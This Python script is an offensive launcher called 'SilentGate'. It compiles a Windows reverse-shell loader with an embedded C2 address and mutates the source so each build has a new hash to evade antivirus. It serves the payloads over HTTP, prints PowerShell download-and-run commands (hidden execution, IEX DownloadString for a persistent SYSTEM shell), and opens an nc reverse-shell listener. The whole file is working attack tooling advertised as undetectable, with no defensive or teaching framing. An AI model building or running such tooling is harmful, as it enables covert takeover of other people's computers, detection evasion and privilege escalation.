#!/usr/bin/env python3
"""
SilentGate - Centralized Launcher
Author: JarDani

One terminal. One command. Zero to shell.

Usage:
  sudo python3 silentgate.py
"""

import os
import sys
import subprocess
import socket
import struct
import time
import threading
import signal
from datetime import datetime

R  = "\033[91m"
W  = "\033[97m"
D  = "\033[90m"
B  = "\033[1m"
G  = "\033[37m"
X  = "\033[0m"

BANNER = f"""
{D}  ════════════════════════════════════════════════════════{X}
{R}{B}
   ███████╗██╗██╗     ███████╗███╗   ██╗████████╗ ██████╗  █████╗ ████████╗███████╗
   ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
   ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║   ██║  ███╗███████║   ██║   █████╗
   ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██╔══██║   ██║   ██╔══╝
   ███████║██║███████╗███████╗██║ ╚████║   ██║   ╚██████╔╝██║  ██║   ██║   ███████╗
   ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
{X}
{D}              Zero detections. Zero UAC. Zero interaction.{X}
{D}  ════════════════════════════════════════════════════════{X}
{D}              Author: JarDani    Version: 1.0{X}
{D}  ════════════════════════════════════════════════════════{X}
"""

SG_PATH = os.path.dirname(os.path.abspath(__file__))
processes = []

def _log(msg, level="*"):
    ts = datetime.now().strftime("%H:%M:%S")
    color = R if level == "!" else D
    print(f"[{ts}] {color}[SG/{level}]{X} {msg}")

def cleanup(sig=None, frame=None):
    _log("Stopping all services...")
    for p in processes:
        try:
            p.terminate()
            p.wait(timeout=2)
        except:
            try: p.kill()
            except: pass
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

def ip_to_hex(ip):
    """Convert IP string to little endian hex for sin_addr.s_addr"""
    packed = socket.inet_aton(ip)
    val = struct.unpack("<I", packed)[0]
    return f"0x{val:08X}"

def port_to_hex(port):
    """Convert port to network byte order hex"""
    val = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF)
    return f"0x{val:04X}"

def get_input(prompt, default=None):
    """Get user input with optional default"""
    if default:
        result = input(f"{W}{prompt}{X} [{D}{default}{X}]: ").strip()
        return result if result else default
    return input(f"{W}{prompt}{X}: ").strip()

def detect_kali_ip():
    """Auto-detect Kali IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return ""

def compile_loader(kali_ip, port):
    """Compile sg_loader.exe with runtime IP support"""
    _log(f"Compiling sg_loader.exe for {kali_ip}:{port}")

    ip_hex   = ip_to_hex(kali_ip)
    port_hex = port_to_hex(port)

    _log(f"C2_IP={ip_hex}  C2_PORT={port_hex}")

    cmd = [
        "x86_64-w64-mingw32-gcc",
        os.path.join(SG_PATH, "output/sg_loader.c"),
        "-o", os.path.join(SG_PATH, "output/sg_loader.exe"),
        "-lws2_32", "-O2", "-mwindows",
        f"-DC2_IP={ip_hex}",
        f"-DC2_PORT={port_hex}"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode == 0:
        _log("sg_loader.exe compiled successfully", "!")
        return True
    else:
        _log(f"Compile failed: {result.stderr}", "!")
        return False

def start_http_server(port=8080):
    """Start HTTP server to serve SilentGate files"""
    # Kill any existing HTTP server on this port
    _log(f"Checking port {port}...")
    subprocess.run(["fuser", "-k", f"{port}/tcp"],
                   capture_output=True)
    import time
    time.sleep(1)
    _log(f"Starting HTTP server on :{port}")
    proc = subprocess.Popen(
        ["python3", "-m", "http.server", str(port)],
        cwd=SG_PATH,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processes.append(proc)
    time.sleep(1)
    if proc.poll() is None:
        _log(f"HTTP server ready", "!")
        return True
    _log("HTTP server failed", "!")
    return False

def start_listener(port):
    """Start nc listener - keeps running after connection drops"""
    _log(f"Starting listener on :{port}")
    # Use -k flag to keep listening after connection closes
    proc = subprocess.Popen(
        ["nc", "-lvnkp", str(port)],
        stdin=sys.stdin,
        stdout=sys.stdout,
        stderr=sys.stderr
    )
    processes.append(proc)
    _log(f"Listener ready on port {port} (persistent)", "!")
    return proc

def show_delivery_command(kali_ip, http_port, target_ip=""):
    exe_url  = f"http://{kali_ip}:{http_port}/output/sg_loader.exe"
    lvl2_url = f"http://{kali_ip}:{http_port}/output/level2.ps1"
    print()
    print(f"\033[91m  {'─'*65}\033[0m")
    print(f"\033[91m  LEVEL 1 — MEDIUM SHELL  Zero UAC  Zero detections\033[0m")
    print(f"\033[91m  {'─'*65}\033[0m")
    print()
    print(f"  \033[37mNew-Item -ItemType Directory -Path 'C:\\ProgramData\\lpe' -Force | Out-Null\033[0m")
    print(f"  \033[37m(New-Object Net.WebClient).DownloadFile('{exe_url}','C:\\ProgramData\\lpe\\sg_loader.exe')\033[0m")
    print(f"  \033[37mStart-Process 'C:\\ProgramData\\lpe\\sg_loader.exe' -WindowStyle Hidden\033[0m")
    print()
    print(f"\033[91m  {'─'*65}\033[0m")
    print(f"\033[91m  LEVEL 2 — SYSTEM SHELL  One UAC click  Persistent\033[0m")
    print(f"\033[91m  {'─'*65}\033[0m")
    print(f"\033[90m  From medium shell run:\033[0m")
    print()
    print(f"  \033[91mIEX(New-Object Net.WebClient).DownloadString('{lvl2_url}')\033[0m")
    print()

def update_chain_ps1(kali_ip, port):
    """Update sg_chain.ps1 with correct IP and port"""
    ps1_path = os.path.join(SG_PATH, "output/sg_chain.ps1")
    try:
        with open(ps1_path, 'r') as f:
            content = f.read()

        # Replace IP
        import re
        content = re.sub(
            r'\$kali\s*=\s*"[^"]*"',
            f'$kali  = "{kali_ip}"',
            content
        )
        # Replace port
        content = re.sub(
            r'\$port\s*=\s*\d+',
            f'$port  = {port}',
            content
        )

        with open(ps1_path, 'w') as f:
            f.write(content)

        _log("sg_chain.ps1 updated with your IP and port")
        return True
    except Exception as e:
        _log(f"Failed to update sg_chain.ps1: {e}", "!")
        return False

def main():
    print(BANNER)

    # Verify root
    if os.geteuid() != 0:
        print(f"{R}[!]{X} Run with sudo: sudo python3 silentgate.py")
        sys.exit(1)

    # Verify mingw compiler
    if subprocess.run(["which", "x86_64-w64-mingw32-gcc"],
                      capture_output=True).returncode != 0:
        print(f"{R}[!]{X} Install: sudo apt install mingw-w64")
        sys.exit(1)

    # Mission briefing - clean no box
    print(f"{R}  MISSION BRIEFING{X}")
    print(f"{D}  {'─'*55}{X}")
    print(f"  {W}LEVEL 1{X}  Medium shell  Zero UAC  Zero detections")
    print(f"{D}           Use when : initial access to any Windows target{X}")
    print(f"{D}           Method   : 3 commands on target then shell connects{X}")
    print()
    print(f"  {W}LEVEL 2{X}  SYSTEM shell  One UAC click  Persistent")
    print(f"{D}           Use when : need full SYSTEM control + persistence{X}")
    print(f"{D}           Method   : L1 shell then 1 command then YES then SYSTEM{X}")
    print(f"{D}  {'─'*55}{X}")
    print()

    # Get configuration


    print()

    detected_ip = detect_kali_ip()
    kali_ip   = get_input("  Your Kali IP", detected_ip)
    target_ip = get_input("  Target Windows IP", "")
    port      = int(get_input("  Listener port", "443"))
    http_port = int(get_input("  HTTP server port", "8080"))

    print()






    print()

    confirm = input(f"  {W}Start? (Enter to continue / Ctrl+C to cancel){X}: ")

    print()
    _log("Starting SilentGate...")

    # Step 1: Quantum mutate + compile loader
    _log("Step 1: Quantum mutation + compile sg_loader.exe...")
    _log("Generating unique binary - different MD5 every time...")
    
    # Run quantum mutator first
    quantum_script = os.path.join(SG_PATH, "core/quantum_mutate.py")
    sg_loader_c = os.path.join(SG_PATH, "output/sg_loader.c")
    quantum_c = "/tmp/sg_loader_quantum.c"
    
    try:
        result = subprocess.run(
            ["python3", quantum_script, sg_loader_c, quantum_c],
            capture_output=True, text=True, timeout=30,
            cwd=SG_PATH
        )
        if os.path.exists(quantum_c):
            _log("Quantum mutation applied - unique binary ready", "!")
            # Compile quantum version
            quantum_compile = [
                "x86_64-w64-mingw32-gcc",
                quantum_c,
                "-o", os.path.join(SG_PATH, "output/sg_loader.exe"),
                "-lws2_32", "-O2", "-mwindows",
                f"-DC2_IP={ip_to_hex(kali_ip)}",
                f"-DC2_PORT={port_to_hex(port)}"
            ]
            r2 = subprocess.run(quantum_compile, capture_output=True,
                               text=True, timeout=30)
            if r2.returncode == 0:
                _log("Unique sg_loader.exe compiled", "!")
            else:
                _log("Quantum compile failed - using standard compile")
                if not compile_loader(kali_ip, port):
                    sys.exit(1)
        else:
            _log("Quantum mutation failed - using standard compile")
            if not compile_loader(kali_ip, port):
                sys.exit(1)
    except Exception as e:
        _log(f"Quantum error: {e} - using standard compile")
        if not compile_loader(kali_ip, port):
            sys.exit(1)

    # Step 2: Update chain PS1
    _log("Step 2: Configuring sg_chain.ps1...")
    update_chain_ps1(kali_ip, port)

    # Step 3: HTTP server
    _log("Step 3: Starting HTTP server...")
    if not start_http_server(http_port):
        sys.exit(1)

    # Step 4: Show delivery command
    show_delivery_command(kali_ip, http_port, target_ip)

    # Step 5: Start listener
    _log("Step 4: Starting reverse shell listener...")
    _log("Waiting for connection...", "!")
    print()

    listener = start_listener(port)
    
    _log("Waiting for shell - press Ctrl+C to stop", "!")
    try:
        listener.wait()
    except KeyboardInterrupt:
        pass

    _log("Session ended")
    cleanup()

if __name__ == "__main__":
    main()
